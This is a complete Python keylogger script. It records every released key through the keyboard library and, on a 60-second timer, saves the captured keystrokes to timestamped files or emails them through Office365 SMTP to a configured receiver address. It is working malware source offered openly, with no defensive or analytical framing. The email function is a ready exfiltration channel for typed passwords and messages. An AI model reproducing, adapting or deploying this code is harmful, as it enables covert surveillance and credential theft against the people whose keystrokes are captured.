import keyboard
from threading import Timer
from datetime import datetime
#For send email functionality
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

class Keylogger:
	def __init__(self, interval, report_method='email'):
		# developer email credentials i.e the email that is used to send the logs
		self.EMAIL_ADDRESS = ""
		self.EMAIL_PASSWORD = ""
		#The reciever email
		self.RECIEVER = ""
		  
		self.interval = interval
		self.report_method = report_method
		
		self.log = ""
		self.start_dt = datetime.now()
		self.end_dt = datetime.now()
	# Function called after key_released 
	def callback(self, event):
		name = event.name
		if len(name) > 1:
			if name == 'space':
				name = " "
			elif name == "enter":
				name = "[ENTER]\n"
			elif name == "decimal":
				name = "."
			else:
				name = name.replace(" ", "_")
				name = f"[{name.upper()}]"
		self.log += name
	#Dynamic filenaming of log files
	#If the report method is set to file this function names the log files so their is no name collision
	def update_filename(self):
		start_dt_str = str(self.start_dt)[:7].replace(" ", "-").replace(":", "")
		end_dt_str = str(self.end_dt)[:7].replace(" ", "-").replace(":", "")
		self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
	#Writes logs to file provided by update_filename() function
	def report_to_file(self):
		with open(f"{self.filename}.keylog", "w") as f:
			print(self.log, file=f)
		print(f"[+] saved {self.filename}.keylog")
	# This function simply writes the email with the log information
	# Reference smtplib python
	def prepare_mail(self, message):
		msg = MIMEMultipart("alternative")
		msg["From"] = self.EMAIL_ADDRESS
		msg["To"] = self.RECIEVER
		msg["Subject"] = "Keylogger logs"
		
		html = f"<p>{message}</p>"
		text_part = MIMEText(message, "plain")
		
		html_part = MIMEText(html, "html")
		msg.attach(text_part)
		msg.attach(html_part)
		
		return msg.as_string()
	def sendmail(self, message, verbose=1):
		server = smtplib.SMTP(host = "smtp.office365.com", port = 587)
		server.starttls()
		server.login(self.EMAIL_ADDRESS, self.EMAIL_PASSWORD)
		
		server.sendmail(self.EMAIL_ADDRESS, self.RECIEVER, self.prepare_mail(message))
		
		server.quit()
		if verbose:	
			print(f"{datetime.now()} - Sent an email to {self.RECIEVER} containing {message}")
	def report(self):
		if self.log:
			self.end_dt = datetime.now()
			self.update_filename()
			if self.report_method == "email":
				self.sendmail(self.log)
			elif self.report_method == "file":
				self.report_to_file()
			print(f"[{self.filename}] - {self.log}")
			self.start_dt = datetime.now()
		self.log = ""
		timer = Timer(interval = self.interval, function=self.report)
		timer.daemon = True
		
		timer.start()
	def start(self):
		self.start_dt = datetime.now()
		
		keyboard.on_release(callback=self.callback)
		
		self.report()
		
		print(f"{datetime.now()} - Started keylogger")
		
		keyboard.wait()
#Time interval for program to wait before sending key logs to report method
SEND_REPORT_EVERY = 60
if __name__ == "__main__":
	keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
	keylogger.start()
